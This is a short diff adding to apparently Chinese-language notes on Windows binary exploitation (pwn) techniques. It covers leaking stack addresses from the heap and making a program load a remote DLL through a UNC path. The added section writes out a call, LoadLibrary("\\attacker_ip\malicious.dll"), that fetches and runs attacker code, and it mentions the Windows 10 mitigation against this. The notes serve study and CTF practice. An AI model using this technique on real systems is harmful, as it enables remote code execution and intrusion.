@@ -101,3 +101,8 @@ int main() {
 # windows的PWN技巧
 ## 從heap上洩漏stack sddress
 通常情況下，heap上是不會有stack上地址的，因為stack上的資料一般比heap上的資料存在時間更短。不過在windows下有一種特殊情況，導致heap上存有stack address: 在CRT初始化的過程中，由於使用了未初始化內存，導致一部分包含stack address的內容被複製到heap上。於是可以從heap上找到stack address，然後修改stack資料。
+
+## LoadLibrary UNC 下載模塊
+由於一般的windows Pwnable沒有辦法直接執行system彈shell，因此需要使用各種各樣的shellcode來完成想要的操作，但是這樣做相當麻煩，在測試shellcode的時候可能發生本地與遠端環境不同等情況，如果能呼叫LoadLibrary，工作量就能大大減輕。    
+LoadLibrary是windows下用來下載DLL的function，由於其支持UNC Path，因此可以呼叫**LoadLibrary("\\attacker_ip\malicious.dll")**，讓程式下載遠端伺服器上攻擊者提供的DLL，從而達到執行任意程式執行。這樣的攻擊方式比執行shellcode更穩定。    
+因此，win10中引入了**Disable Remote Image Loading**機制，若程式執行時開啟此項緩解措施，則無法使用UNC PATH下載遠端DLL。
